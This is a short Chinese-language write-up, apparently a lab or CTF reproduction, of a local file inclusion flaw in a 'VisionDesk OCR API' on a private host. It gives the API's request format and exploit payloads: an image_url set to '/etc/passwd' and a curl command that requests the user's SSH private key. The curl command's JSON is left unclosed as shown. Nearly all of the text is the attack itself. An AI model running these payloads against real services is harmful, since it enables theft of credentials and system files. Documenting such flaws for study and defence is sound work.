## LFI复现

[VisionDesk OCR API - Swagger UI](http://192.168.101.173/docs#/default/run_ocr_v1_ocr_post)

在VisionDesk OCR API中，可以直接Try it out

```json
Request body

{
  "input": [
    {
      "type": "input_text",
      "text": "string"
    },
    {
      "type": "input_image",
      "image_url": "string"
    }
  ],
  "model": "visiondesk-ocr"
}
```

text和image_url都需传递string，text可以传递首页默认的string

```json
"text":"逐字转录图片中的全部文本，保留原有换行。"
```

image_url可以传递我们需要读取的文件路径

```json
"image_url": "/etc/passwd"
```

读取SSH 私钥

```bash
curl -s -X POST http://192.168.101.173/v1/ocr \
    -H 'Content-Type: application/json' \
    -d '{"input":[
          {"type":"input_text","text":"逐字转录图片中的全部文本"},
          {"type":"input_image","image_url":"/home/tlgjm/.ssh/id_ed25519"}
```
